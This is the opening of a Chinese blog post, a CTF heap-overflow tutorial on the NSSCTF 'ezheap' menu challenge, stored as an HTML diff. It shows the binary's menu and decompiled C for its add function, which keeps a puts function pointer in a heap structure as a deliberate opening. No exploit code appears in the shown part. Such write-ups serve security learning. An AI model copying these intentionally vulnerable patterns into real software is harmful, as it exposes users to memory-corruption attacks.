@@ -1,0 +1,674 @@
+<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.146.0"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="从零开始的 Pwn 之旅 - 简单的堆溢出"><meta itemprop=description content="不想写博客..."><meta name=description content="不想写博客..."><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=keywords content="Ctf,Pwn"><meta property="og:type" content="article"><meta property="og:title" content="从零开始的 Pwn 之旅 - 简单的堆溢出"><meta property="og:description" content="不想写博客..."><meta property="og:image" content="/imgs/avatar.jpg"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/"><meta property="og:site_name" content="lhon901's blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="lhon901"><meta property="article:published_time" content="2025-08-15 13:22:57 +0800 +0800"><meta property="article:modified_time" content="2025-08-16 12:02:43 +0800 +0800"><link type=text/css rel=stylesheet href=/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1755317041"><style type=text/css>.post-footer hr:after{content:"~ 我可是有底线的哟 ~"}.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>从零开始的 Pwn 之旅 - 简单的堆溢出 - lhon901's blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>lhon901's blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description></p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-flinks"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-thumbs-up hvr-icon"></i>友情链接</a></li><li class="menu-item menu-item-example"><a href=/ class="menus-parent hvr-icon-pulse" rel=section><i class="fa fa-angles-down hvr-icon"></i>语法示例
+<span class=menu-item-shrink-icon><i class="fa fa-angle-right"></i></span></a><ul class=menu-children><li class=menu-child-item><a href=/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>语法高亮</a></li><li class=menu-child-item><a href=/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>数学公式</a></li><li class=menu-child-item><a href=/post/11-mermaid-charts class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>流程图</a></li></ul></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
+<span class=badge>25</span></a></li><li class="menu-item menu-item-commonweal"><a href=/404.html class=hvr-icon-pulse rel=section><i class="fa fa-heartbeat hvr-icon"></i>公益 404</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#示例>示例</a><ul><li><a href=#ezheap><a href=https://www.nssctf.cn/problem/3104>ezheap</a></a></li></ul></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=lhon901 src=/imgs/img-lazy-loading.gif data-src=/imgs/avatar.jpg><p class=site-author-name itemprop=name>lhon901</p><div class=site-description itemprop=description>不想写博客...</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>25</span>
+<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>2</span>
+<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>3</span>
+<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/craftopc title="Github → https://github.com/craftopc" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
+Github
+</a></span><span class=links-of-social-item><a href=mailto:lhon901@163.com title="E-Mail → mailto:lhon901@163.com" rel=noopener class=hvr-icon-pulse target=_blank><i class="fa fa-envelope fa-fw hvr-icon"></i>
+E-Mail</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
+友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://gitee.com/hugo-next/hugo-theme-next title=https://gitee.com/hugo-next/hugo-theme-next target=_blank>Hugo-NexT</a></li><li class=links-of-blogroll-item><a href=https://lisenhui.cn title=https://lisenhui.cn target=_blank>凡梦星尘空间站</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
+<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate="2025-04-14 20:18:58 +0800 +0800"></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=56762></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=124></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate="2025-08-16 12:02:43 +0800 +0800"></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-i18n-translate class=button title=多语言翻译><i class="fas fa-globe"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
+<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/hugo-next rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
+</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="lhon901"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="lhon901"><meta itemprop=description content="不想写博客..."></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="从零开始的 Pwn 之旅 - 简单的堆溢出"><meta itemprop=description content='示例
+
+
+
+    ezheap
+    
+    
+    
+
+
+经典菜单题
+
+
+
+1
+2
+3
+4
+5
+6
+7
+
+
+~/D/ezheap ❯❯❯ ./ezheap
+Easy Note.
+1.Add.
+2.Delete.
+3.Show.
+4.Edit.
+Choice:
+
+
+
+add 函数
+
+
+
+ 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+
+
+int add()
+{
+  __int64 v0; // rbx
+  __int64 v1; // rax
+  int v3; // [rsp+0h] [rbp-20h]
+  int v4; // [rsp+4h] [rbp-1Ch]
+
+  puts("Input your idx:");
+  v3 = getnum();
+  puts("Size:");
+  v4 = getnum();
+  if ( (unsigned int)v4 > 0x100 )
+  {
+    LODWORD(v1) = puts("Invalid!");
+  }
+  else
+  {
+    heaplist[v3] = malloc(0x20u);
+    if ( !heaplist[v3] )
+    {
+      puts("Malloc Error!");
+      exit(1);
+    }
+    v0 = heaplist[v3];
+    *(_QWORD *)(v0 + 16) = malloc(v4);
+    *(_QWORD *)(heaplist[v3] + 32LL) = &amp;puts;
+    if ( !*(_QWORD *)(heaplist[v3] + 16LL) )
+    {
+      puts("Malloc Error!");
+      exit(1);
+    }
+    sizelist[v3] = v4;
+    puts("Name: ");
+    if ( !(unsigned int)read(0, (void *)heaplist[v3], 0x10u) )
+    {
+      puts("Something error!");
+      exit(1);
+    }
+    puts("Content:");
+    if ( !(unsigned int)read(0, *(void **)(heaplist[v3] + 16LL), sizelist[v3]) )
+    {
+      puts("Error!");
+      exit(1);
+    }
+    puts("Done!");
+    v1 = heaplist[v3];
+    *(_DWORD *)(v1 + 24) = 1;
+  }
+  return v1;
+}
+
+
+
+detele 函数'></span><header class=post-header><h1 class=post-title itemprop="name headline">从零开始的 Pwn 之旅 - 简单的堆溢出
+<a href=https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/posts/%e4%bb%8e%e9%9b%b6%e5%bc%80%e5%a7%8b%e7%9a%84%20Pwn%20%e4%b9%8b%e6%97%85%20-%20%e7%ae%80%e5%8d%95%e7%9a%84%e5%a0%86%e6%ba%a2%e5%87%ba.md rel="noopener external nofollow noreferrer" target=_blank class="exturl post-edit-link" title=编辑><i class="fa fa-pen-nib"></i></a></h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
+</span><span class=post-meta-item-text title=发表于>发表于：
+</span><time title="创建时间：2025-08-15 13:22:57 +08:00" itemprop="dateCreated datePublished" datetime="2025-08-15 13:22:57 +0800 +0800">2025-08-15
+</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar-check"></i>
+</span><span class=post-meta-item-text title=更新于>更新于：
+</span><time title="修改时间：2025-08-16 12:02:43 +08:00" itemprop="dateModified dateLastmod" datetime="2025-08-16 12:02:43 +0800 +0800">2025-08-16
+</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
+</span><span class=post-meta-item-text title=分类于>分类于：
+</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/ctf/ itemprop=url rel=index><span itemprop=name>Ctf</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
+</span><span class=post-meta-item-text>字数：</span>
+<span>1201</span>
+</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
+</span><span class=post-meta-item-text>阅读：&ap;</span>
+<span>3分钟</span>
+</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
+</span><span class=post-meta-item-text>浏览：
+</span><span id=busuanzi_value_page_pv data-path=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><h2 id=示例>示例
+<a class=header-anchor href=#%e7%a4%ba%e4%be%8b></a></h2><h3 id=ezheap><a href=https://www.nssctf.cn/problem/3104 title=ezheap rel="noopener external nofollow noreferrer" target=_blank class=exturl>ezheap
+<i class="fa fa-external-link-alt"></i>
+</a><a class=header-anchor href=#ezheap></a></h3><p>经典菜单题</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-0-1><a class=lnlinks href=#hl-0-1>1</a>
+</span><span class=lnt id=hl-0-2><a class=lnlinks href=#hl-0-2>2</a>
+</span><span class=lnt id=hl-0-3><a class=lnlinks href=#hl-0-3>3</a>
+</span><span class=lnt id=hl-0-4><a class=lnlinks href=#hl-0-4>4</a>
+</span><span class=lnt id=hl-0-5><a class=lnlinks href=#hl-0-5>5</a>
+</span><span class=lnt id=hl-0-6><a class=lnlinks href=#hl-0-6>6</a>
+</span><span class=lnt id=hl-0-7><a class=lnlinks href=#hl-0-7>7</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~/D/ezheap ❯❯❯ ./ezheap
+</span></span><span class=line><span class=cl>Easy Note.
+</span></span><span class=line><span class=cl>1.Add.
+</span></span><span class=line><span class=cl>2.Delete.
+</span></span><span class=line><span class=cl>3.Show.
+</span></span><span class=line><span class=cl>4.Edit.
+</span></span><span class=line><span class=cl>Choice:</span></span></code></pre></td></tr></table></div></div><p>add 函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-1-1><a class=lnlinks href=#hl-1-1> 1</a>
+</span><span class=lnt id=hl-1-2><a class=lnlinks href=#hl-1-2> 2</a>
+</span><span class=lnt id=hl-1-3><a class=lnlinks href=#hl-1-3> 3</a>
+</span><span class=lnt id=hl-1-4><a class=lnlinks href=#hl-1-4> 4</a>
+</span><span class=lnt id=hl-1-5><a class=lnlinks href=#hl-1-5> 5</a>
+</span><span class=lnt id=hl-1-6><a class=lnlinks href=#hl-1-6> 6</a>
+</span><span class=lnt id=hl-1-7><a class=lnlinks href=#hl-1-7> 7</a>
+</span><span class=lnt id=hl-1-8><a class=lnlinks href=#hl-1-8> 8</a>
+</span><span class=lnt id=hl-1-9><a class=lnlinks href=#hl-1-9> 9</a>
+</span><span class=lnt id=hl-1-10><a class=lnlinks href=#hl-1-10>10</a>
+</span><span class=lnt id=hl-1-11><a class=lnlinks href=#hl-1-11>11</a>
+</span><span class=lnt id=hl-1-12><a class=lnlinks href=#hl-1-12>12</a>
+</span><span class=lnt id=hl-1-13><a class=lnlinks href=#hl-1-13>13</a>
+</span><span class=lnt id=hl-1-14><a class=lnlinks href=#hl-1-14>14</a>
+</span><span class=lnt id=hl-1-15><a class=lnlinks href=#hl-1-15>15</a>
+</span><span class=lnt id=hl-1-16><a class=lnlinks href=#hl-1-16>16</a>
+</span><span class=lnt id=hl-1-17><a class=lnlinks href=#hl-1-17>17</a>
+</span><span class=lnt id=hl-1-18><a class=lnlinks href=#hl-1-18>18</a>
+</span><span class=lnt id=hl-1-19><a class=lnlinks href=#hl-1-19>19</a>
+</span><span class=lnt id=hl-1-20><a class=lnlinks href=#hl-1-20>20</a>
+</span><span class=lnt id=hl-1-21><a class=lnlinks href=#hl-1-21>21</a>
+</span><span class=lnt id=hl-1-22><a class=lnlinks href=#hl-1-22>22</a>
+</span><span class=lnt id=hl-1-23><a class=lnlinks href=#hl-1-23>23</a>
+</span><span class=lnt id=hl-1-24><a class=lnlinks href=#hl-1-24>24</a>
+</span><span class=lnt id=hl-1-25><a class=lnlinks href=#hl-1-25>25</a>
+</span><span class=lnt id=hl-1-26><a class=lnlinks href=#hl-1-26>26</a>
+</span><span class=lnt id=hl-1-27><a class=lnlinks href=#hl-1-27>27</a>
+</span><span class=lnt id=hl-1-28><a class=lnlinks href=#hl-1-28>28</a>
+</span><span class=lnt id=hl-1-29><a class=lnlinks href=#hl-1-29>29</a>
+</span><span class=lnt id=hl-1-30><a class=lnlinks href=#hl-1-30>30</a>
+</span><span class=lnt id=hl-1-31><a class=lnlinks href=#hl-1-31>31</a>
+</span><span class=lnt id=hl-1-32><a class=lnlinks href=#hl-1-32>32</a>
+</span><span class=lnt id=hl-1-33><a class=lnlinks href=#hl-1-33>33</a>
+</span><span class=lnt id=hl-1-34><a class=lnlinks href=#hl-1-34>34</a>
+</span><span class=lnt id=hl-1-35><a class=lnlinks href=#hl-1-35>35</a>
+</span><span class=lnt id=hl-1-36><a class=lnlinks href=#hl-1-36>36</a>
+</span><span class=lnt id=hl-1-37><a class=lnlinks href=#hl-1-37>37</a>
+</span><span class=lnt id=hl-1-38><a class=lnlinks href=#hl-1-38>38</a>
+</span><span class=lnt id=hl-1-39><a class=lnlinks href=#hl-1-39>39</a>
+</span><span class=lnt id=hl-1-40><a class=lnlinks href=#hl-1-40>40</a>
+</span><span class=lnt id=hl-1-41><a class=lnlinks href=#hl-1-41>41</a>
+</span><span class=lnt id=hl-1-42><a class=lnlinks href=#hl-1-42>42</a>
+</span><span class=lnt id=hl-1-43><a class=lnlinks href=#hl-1-43>43</a>
+</span><span class=lnt id=hl-1-44><a class=lnlinks href=#hl-1-44>44</a>
+</span><span class=lnt id=hl-1-45><a class=lnlinks href=#hl-1-45>45</a>
+</span><span class=lnt id=hl-1-46><a class=lnlinks href=#hl-1-46>46</a>
+</span><span class=lnt id=hl-1-47><a class=lnlinks href=#hl-1-47>47</a>
+</span><span class=lnt id=hl-1-48><a class=lnlinks href=#hl-1-48>48</a>
+</span><span class=lnt id=hl-1-49><a class=lnlinks href=#hl-1-49>49</a>
+</span><span class=lnt id=hl-1-50><a class=lnlinks href=#hl-1-50>50</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>add</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>v0</span><span class=p>;</span> <span class=c1>// rbx
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// rax
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [rsp+0h] [rbp-20h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// [rsp+4h] [rbp-1Ch]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Input your idx:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=nf>getnum</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Size:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v4</span> <span class=o>=</span> <span class=nf>getnum</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v4</span> <span class=o>&gt;</span> <span class=mh>0x100</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>LODWORD</span><span class=p>(</span><span class=n>v1</span><span class=p>)</span> <span class=o>=</span> <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Invalid!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>heaplist</span><span class=p>[</span><span class=n>v3</span><span class=p>]</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x20u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v3</span><span class=p>]</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Malloc Error!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>v0</span> <span class=o>=</span> <span class=n>heaplist</span><span class=p>[</span><span class=n>v3</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>v0</span> <span class=o>+</span> <span class=mi>16</span><span class=p>)</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>v4</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v3</span><span class=p>]</span> <span class=o>+</span> <span class=mi>32LL</span><span class=p>)</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>puts</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v3</span><span class=p>]</span> <span class=o>+</span> <span class=mi>16LL</span><span class=p>)</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Malloc Error!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>sizelist</span><span class=p>[</span><span class=n>v3</span><span class=p>]</span> <span class=o>=</span> <span class=n>v4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Name: &#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v3</span><span class=p>],</span> <span class=mh>0x10u</span><span class=p>)</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Something error!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Content:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=o>**</span><span class=p>)(</span><span class=n>heaplist</span><span class=p>[</span><span class=n>v3</span><span class=p>]</span> <span class=o>+</span> <span class=mi>16LL</span><span class=p>),</span> <span class=n>sizelist</span><span class=p>[</span><span class=n>v3</span><span class=p>])</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Error!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Done!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>v1</span> <span class=o>=</span> <span class=n>heaplist</span><span class=p>[</span><span class=n>v3</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>v1</span> <span class=o>+</span> <span class=mi>24</span><span class=p>)</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
